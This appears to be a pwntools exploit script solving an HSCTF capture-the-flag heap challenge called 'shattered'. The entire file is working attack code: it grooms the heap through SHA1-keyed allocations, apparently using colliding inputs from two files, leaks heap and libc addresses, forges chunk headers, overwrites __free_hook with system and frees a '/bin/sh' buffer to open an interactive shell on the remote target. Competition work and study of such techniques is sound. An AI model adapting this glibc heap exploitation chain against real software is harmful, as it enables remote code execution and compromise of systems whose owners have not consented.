from pwn import *
import hashlib

e = ELF("./shattered")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.hsctf.com", 5010)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

cnt = 0
def alloc(size, data="", stk="AAAA"):
  global cnt
  cnt += 1

  p.sendlineafter(">", "1")
  p.sendlineafter(">", str(size))

  if len(data) == 0:
    data = str(cnt)

  if len(data) != size:
    data = data.ljust(size, "\x00")
  p.sendafter(">", data)
  p.sendlineafter(">", stk)

  return data

def delete(data):
  p.sendlineafter(">", "2")
  p.sendafter(">", hashlib.sha1(data).digest())

def view(data):
  p.sendlineafter(">", "3")
  p.sendafter(">", hashlib.sha1(data).digest())

A = alloc(0x38, "A"*0x38)
delete(A)

root = alloc(0x10, "AAAA")
B = alloc(0x10, "B")
C = alloc(0x10, "C")
view(B)

p.recvuntil("AAAA")

leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))
print(hex(leak))

delete(root)

def get_bytes(f):
  fl = open(f, "rb")
  data = fl.read()
  fl.close()

  return data

HA = get_bytes("1.txt")
HB = get_bytes("2.txt")

root = alloc(0x10)
alloc(len(HA), HA)


padd_size = 0x270
delete(alloc(padd_size))
alloc(0x10)

tmp = alloc(0x10)
alloc(len(HB), HB, "A"*0x38 + p64(leak - 0x5646d64b9320 + 0x00005646d64b9550 - 0x20))

delete(alloc(0x50))

alloc(padd_size)

A = alloc(0x500)
B = alloc(0x10)

delete(B)
delete(A)
delete(root)

root = alloc(0x10, "B")
left = alloc(0x10, "AE")

alloc(padd_size, (
  "A" * 0x38 
  + p64(0x151).ljust(0x150, "\x00") 
  + p64(0x41).ljust(0x40, "\x00") 
  + p64(0x401).ljust(0x60, "\x02")
  + p64(0x41).ljust(0x40, "\x10")
).ljust(padd_size, "B"))

p.sendlineafter(">", "3")
p.sendafter(">", "\x10" * 20)

p.recvuntil("B" * 8)
ubin = u64(p.recvline(keepends=False).ljust(8, "\x00"))
libc_base = ubin - 0x7f28771c6ca0 + 0x00007f2876ddb000
print(hex(libc_base))

delete(root)

debug()

delete(alloc(0x50))
delete(alloc(0x3f0, 
  "A"*0x58 
  + p64(0x41).ljust(0x40, "\x00") 
  + (p64(0x101) + p64(ubin) * 2).ljust(0x100 - 8, "\x00") + p64(0x100)
  + p64(0x21).ljust(0x20, "\x00")
  + p64(0x21).ljust(0x20, "\x00")
))

delete(alloc(0x40))

delete(alloc(0x3f0, 
  "A"*0x58 
  + p64(0x41).ljust(0x40, "\x00") 
  + (p64(0x51) + p64(libc_base + libc.symbols["__free_hook"] - 8)).ljust(0x50, "\x00")
  + (p64(0xb1) + p64(ubin) * 2).ljust(0xb0 - 8, "\x00") + p64(0xb0)
  + p64(0x21).ljust(0x20, "\x00")
  + p64(0x21).ljust(0x20, "\x00")
))

alloc(0x40)
win = alloc(0x40, "/bin/sh\x00" + p64(libc.symbols["system"] + libc_base))

delete(win)

p.interactive()
